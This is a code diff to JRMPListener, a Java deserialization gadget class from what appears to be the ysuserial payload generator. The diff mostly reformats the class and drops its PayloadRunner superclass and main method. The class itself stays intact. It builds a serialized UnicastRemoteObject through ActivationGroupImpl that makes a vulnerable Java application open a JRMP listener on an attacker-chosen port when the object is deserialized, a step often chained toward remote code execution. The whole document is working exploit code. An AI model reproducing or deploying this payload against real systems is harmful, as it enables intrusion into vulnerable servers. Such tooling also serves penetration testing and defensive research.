@@ -8,7 +8,6 @@ import java.rmi.server.UnicastRemoteObject;
 import sun.rmi.server.ActivationGroupImpl;
 import sun.rmi.server.UnicastServerRef;
 import org.su18.ysuserial.payloads.annotation.Authors;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 
@@ -23,33 +22,28 @@ import org.su18.ysuserial.payloads.util.Reflections;
  * TCPEndpoint.exportObject(Target) line: 411
  * TCPTransport.exportObject(Target) line: 249
  * TCPTransport.listen() line: 319
- *
+ * <p>
  * Requires:
  * - JavaSE
- *
+ * <p>
  * Argument:
  * - Port number to open listener to
  */
-@SuppressWarnings ( {
-    "restriction"
-} )
-@Authors({ Authors.MBECHLER })
-public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
+@SuppressWarnings({
+		"restriction"
+})
+@Authors({Authors.MBECHLER})
+public class JRMPListener implements ObjectPayload<UnicastRemoteObject> {
 
-    public UnicastRemoteObject getObject ( final String command ) throws Exception {
-        int jrmpPort = Integer.parseInt(command);
-        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
-            RemoteRef.class
-        }, new Object[] {
-            new UnicastServerRef(jrmpPort)
-        });
+	public UnicastRemoteObject getObject(final String command) throws Exception {
+		int jrmpPort = Integer.parseInt(command);
+		UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[]{
+				RemoteRef.class
+		}, new Object[]{
+				new UnicastServerRef(jrmpPort)
+		});
 
-        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
-        return uro;
-    }
-
-
-    public static void main ( final String[] args ) throws Exception {
-        PayloadRunner.run(JRMPListener.class, args);
-    }
+		Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
+		return uro;
+	}
 }
